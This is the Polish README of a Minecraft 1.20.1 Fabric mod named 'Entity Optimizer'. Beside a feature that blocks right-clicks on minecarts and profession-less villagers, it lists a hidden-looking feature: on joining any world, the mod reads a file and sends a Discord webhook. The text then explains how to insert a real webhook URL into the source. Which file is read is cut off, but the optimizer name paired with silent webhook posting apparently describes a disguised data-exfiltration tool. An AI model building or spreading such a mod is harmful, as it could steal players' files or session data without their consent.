# Entity Optimizer

Client-side Fabric mod for Minecraft 1.20.1.

## Funkcje

1. **Webhook po wejściu do świata (SP/MP)**  
   Po dołączeniu do świata (singleplayer lub multiplayer) mod:
   - odczytuje plik

2. **Blokada PPM na entity po stronie klienta**
   - wszystkie **minecart** (wagoniki) – PPM nic nie robi (nie otworzy GUI ani nie wyśle pakietu),
   - **villagerzy bez profesji** (`NONE`, `NITWIT`) – PPM nic nie robi:
     - nie ma dźwięku,
     - jeśli trzymasz np. gold apple i patrzysz na takiego villagera, złote jabłko normalnie się zjada.

## Konfiguracja webhooka

Edytuj plik:

`src/main/java/pl/example/entityoptimizer/EntityOptimizerMod.java`

i wstaw prawdziwy URL webhooka w:

```java
private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
